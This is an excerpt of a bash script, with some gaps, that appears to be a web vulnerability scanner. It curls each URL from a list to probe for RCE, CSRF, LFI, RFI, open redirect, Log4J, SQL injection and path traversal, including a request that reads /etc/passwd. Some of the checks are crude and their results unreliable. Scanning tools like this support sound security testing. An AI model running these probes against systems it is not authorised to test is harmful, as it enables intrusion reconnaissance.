...
if [[ $response == *"vulnerable"* ]]; then
  echo "$url is RCE \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
else
  echo "$url is not RCE \033[32mVulnerable\033[0m"
fi
 
echo "Testing $url for CSRF vulnerability..." | lolcat
response=$(curl -s -X POST -d 'token=test' "$url")
if [[ $response == *"token=test"* ]]; then
  echo "$url is CSRF \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
else
  echo "$url is not CSRF \033[32mVulnerable\033[0m"
fi
...
if [[ $response == *"root:"* ]]; then
  echo "$url is LFI \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
else
  echo "$url is not LFI \033[32mVulnerable\033[0m"
fi
  ...
  if [[ $response == *"<title>Google</title>"* ]]; then
    echo "$url is open redirect \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
  else
    echo "$url is not open redirect \033[32mVulnerable\033[0m"
  fi
  ...
  if [[ $response == *"log4j"* ]]; then
    echo "$url is Log4J \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
  else
    echo "$url is not Log4J \033[32mVulnerable\033[0m"
  fi
  echo "Testing $url for RFI vulnerability..." | lolcat
  # Check for RFI vulnerability
  response=$(curl -s "$url?file=http://google.com")
  if [[ $response == *"<title>Google</title>"* ]]; then
    echo "$url is RFI \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
  else
    echo "$url is not RFI \033[32mVulnerable\033[0m"
  fi
 # Check for directory traversal vulnerability
  echo "Testing $url for path/directory traversal vulnerability..." | lolcat
response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
if [[ $response == *"root:"* ]]; then
  echo "$url is path traversal \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
else
  echo "$url is not path traversal \033[32mVulnerable\033[0m"
fi
...
if [[ $response == *"SQL syntax"* ]]; then
  echo "$url is SQL injection \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
else
  echo "$url is not SQL injection \033[32mVulnerable\033[0m"
fi
done < urls.txt
mv urls.txt $domain
